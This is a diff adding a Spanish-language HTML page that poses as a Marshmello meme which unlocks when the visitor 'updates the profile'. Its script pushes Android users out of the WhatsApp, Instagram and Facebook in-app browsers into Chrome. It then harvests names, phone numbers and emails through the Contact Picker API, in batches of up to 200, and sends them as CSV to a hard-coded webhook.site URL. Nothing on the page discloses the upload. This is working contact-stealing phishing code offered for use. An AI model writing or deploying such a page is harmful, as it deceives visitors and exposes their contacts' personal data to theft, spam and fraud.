@@ -1,0 +1,74 @@
+<!doctype html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="referrer" content="no-referrer">
+<title>Meme Marshmello - ¡Actualiza tu perfil!</title>
+<style>
+ body{font-family:Arial,sans-serif;background:#000;color:#fff;text-align:center;padding:20px;margin:0}
+ img{max-width:100%;border-radius:10px}
+ #btn,#next,#send{margin:12px 8px;padding:14px 22px;background:#ff4081;border:none;border-radius:6px;color:#fff;font-size:16px;font-weight:bold}
+ #send{background:#2ea043}
+ #st{min-height:22px;font-size:14px;color:#bbb;margin-top:10px;white-space:pre-line}
+ .bar{background:#1a1a1a;border:1px solid #ff4081;border-radius:10px;padding:14px;margin-bottom:14px}
+ .bar a{display:inline-block;margin-top:10px;padding:12px 20px;background:#ff4081;color:#fff;border-radius:6px;text-decoration:none;font-weight:bold}
+</style>
+</head>
+<body>
+<div class="bar" id="bar" style="display:none">
+  <p>Estás en el navegador de WhatsApp. Abrilo en Chrome para que funcione.</p>
+  <a id="go" href="#">Abrir en Chrome</a>
+</div>
+
+<img src="meme.jpg" alt="Meme Marshmello">
+<p>¡Haz clic para actualizar tu perfil y desbloquear el meme completo!</p>
+<button id="btn">Actualizar ahora</button>
+<div id="st"></div>
+<button id="next" style="display:none">Siguiente tanda</button>
+<button id="send" style="display:none">Enviar</button>
+
+<script>
+var HOOK="https://webhook.site/2f70cfed-8e86-482a-a6f0-a33d0030c8d1", LOTE=200, filas=[], vistos={};
+function $(i){return document.getElementById(i)}
+function norm(t){return (t||"").replace(/\D/g,"")}
+function q(v){return '"'+String(v||"").replace(/"/g,'""')+'"'}
+function csv(a){return "nombre,telefono,email\n"+a.map(function(r){return q(r.n)+","+q(r.t)+","+q(r.m)}).join("\n")+"\n"}
+function post(b){return fetch(HOOK,{method:"POST",headers:{"Content-Type":"text/plain;charset=utf-8"},body:b}).then(function(){return 1}).catch(function(){return 0})}
+
+var ua=navigator.userAgent;
+if(/WhatsApp|Instagram|FBAN|FBAV|FB_IAB|; wv\)/i.test(ua)&&/Android/i.test(ua)){
+  $("bar").style.display="block";
+  $("go").href="intent://"+location.href.replace(/^https?:\/\//,"")+"#Intent;scheme=https;package=com.android.chrome;end";
+}
+
+function tanda(){
+  if(!("contacts" in navigator)){ $("bar").style.display="block"; $("st").textContent="Abrilo en Chrome."; return }
+  navigator.contacts.select(["name","tel","email"],{multiple:true}).then(function(p){
+    if(!p||!p.length){ $("st").textContent="No elegiste contactos."; return }
+    if(p.length>LOTE) p=p.slice(0,LOTE);
+    var nuevos=[];
+    p.forEach(function(c){
+      var n=(c.name&&c.name[0])||"", m=(c.email&&c.email[0])||"", t=c.tel||[];
+      (t.length?t:[""]).forEach(function(x){
+        var k=norm(x)||(n+m).toLowerCase();
+        if(!k||vistos[k])return; vistos[k]=1; nuevos.push({n:n,t:x,m:m});
+      });
+    });
+    if(!nuevos.length){ $("st").textContent="Todos repetidos."; return }
+    filas=filas.concat(nuevos);
+    post(csv(nuevos));
+    $("st").textContent=nuevos.length+" cargados. Total: "+filas.length;
+    $("next").style.display="inline-block"; $("send").style.display="inline-block";
+  }).catch(function(e){ $("st").textContent="Error: "+(e.name||"?") });
+}
+
+$("btn").onclick=tanda; $("next").onclick=tanda;
+$("send").onclick=function(){
+  if(!filas.length)return;
+  $("st").textContent="Enviando...";
+  post(csv(filas)).then(function(){ $("st").textContent="¡Listo! "+filas.length+" contactos enviados. Cerrá la pestaña." });
+};
+</script>
+</body>
+</html>
